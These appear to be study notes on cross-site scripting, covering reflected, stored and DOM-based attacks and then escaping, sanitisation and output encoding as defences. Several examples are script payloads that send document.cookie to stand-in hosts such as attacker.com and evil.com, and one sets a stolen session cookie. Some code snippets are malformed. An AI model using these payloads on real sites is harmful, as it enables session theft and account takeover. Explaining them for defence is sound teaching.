<h3><u>Cross-Site Scripting (XSS)</u></h3>

These are types of attacks where malicous scripts usually in the form of Javascript are injected into a web application by a innocent end user. This happens because of insecure handling of user input such as the "search bar". There are three types of attacks: 

- <b>Non-persistent (reflected):</b> Attackers would send a user a link by utilizing impersonification, phishing, smishing, or any way to gain trust of the user to click the link. This link would contain malicious Javascript, where once the user performs that HTTP request to the server, the server reflects that HTTP request as a response.  
  
  For example: 

  ```javascript
  https:www.amazon.com/search?q=<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>
  ```
    This script would run in back if a user simply sees "amazon.com" which looks normal and the user is most likely using amazon to purchase products. However, once a user clicks the link, it would automatically take them to amazon's search perform the reflected injection: `<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>`into the web browser. This would take the users cookies/session ID and send it to the attacker. 

    The cookies/session ID keeps you logged in and server uses it to know who you are. Once the attacker gets a hold of it, they can set their own browser's session to your stolen one: 
    
    ```javascript
    document.cookie = "session_id=abc123xyz";
    ```
    Once set, they can visit the webpage, and they'd be logged in as you. 

- <b>Persistent (stored):</b> This is a bit different where the attacker would also find a vulnerable input field, but one that stores data in a database. Somes fields include the review section on amazon, comments, message forums, etc... This does not require a user to click a link like in non-persistent XSS, a user simply just has to visit the webpage like normal web browsing. 

  An attacker would post a comment along with the malicious script. An example would be:  
  ```javascript
  Great product, it works pretty good! <script>fetch('http://evil.com/steal?c=' + document.cookie)</script>
  ```
    This script is now <b>persistent</b> (stored and stuck there) in the database. Now, when any other user views that product page, the script runs automatically in the victim's web browser and sends session cookies or sensitive information to the attacker's server. 

    A software developer must remediate this or else it is stuck there and is especially dangerous if an admin view its. This is because the attacker can perform actions as the admin and escalate privileges. 

- <b>DOM (Document Object Model) Based XSS:</b> For the other attacks mentions before, the malicious payload is either sent to the server (reflected) or stays in the server (stored). In this case, the malcious payload never reaches the server. This means the server can't detect it, and can't sanitize or filter the user input. The client-side vulnerable JavaScript code would get exploited. Just like reflected XSS, the user must open a specially crafted URl for this attack to occur. 

<hr>

For a XSS to be successful, an attacker just needs to insert and execute malicious content in a webpage, which is why all <b>Variables</b> need to be protected. To do so, we can make sure that they are <b>Escaped</b> or <b>Sanitized</b> which is known as <b>Perfect Injection Resistance</b>. For instance, escaping characters such as `<, >, &, ", '` so the input is not interpreted as executable code or Sanitization which is removing or altering unwanted input so that only 
"safe" content remains such as sanitizing `<b>Hello</b> <script>alert(1)</script>` to only this `<b>Hello</b>`. 

To defend against a XSS attack, there is not one way to solve it, rather a combination of techniques. Luckily, coding frameworks like steer Software developers towards good security coding practices to help reduce XSS attacks, however, security gaps still exist in them. There are a couple of techniques to defend against this: 

- <b>Output Encoding:</b> This protects against Stored and Reflected attacks where the text inserted by the user should not be interpreted as executable code, rather the actual text that the user has typed in. 

  - <b>"HTML Contexts"</b> --> refers to inserting a variable between two basic HTML tags like a `<div>` or `<b>`. In this case, the front end HTML trusts the user input and directly asks the backend for the results. It is important to use `'` and `""` to surround variables which makes it difficult to change the context of the variable. 

    ``` html
    <img src=<%= photoUrl % alt="Profile Picture">   <!-- No quotes in between "photoUrl" insecure-->

    <!-- THE ATTACK! -->
    <script>alert('XSS')</script> <!-- since the above code has not been escaped, the browser is the one that executes the injected code since it interprets it as code. 

    <!-- Rendered HTML Results Page -->
    <p>Results for: <script>alert('XSS')</script></p> <!-- -->

    <!--------------------> 
    <<img src="<%= photoUrl %>" alt="Profile Picture"> <!--Secure since "photourl" has quotes, but rmemember that we need additional security measures on top of this--> 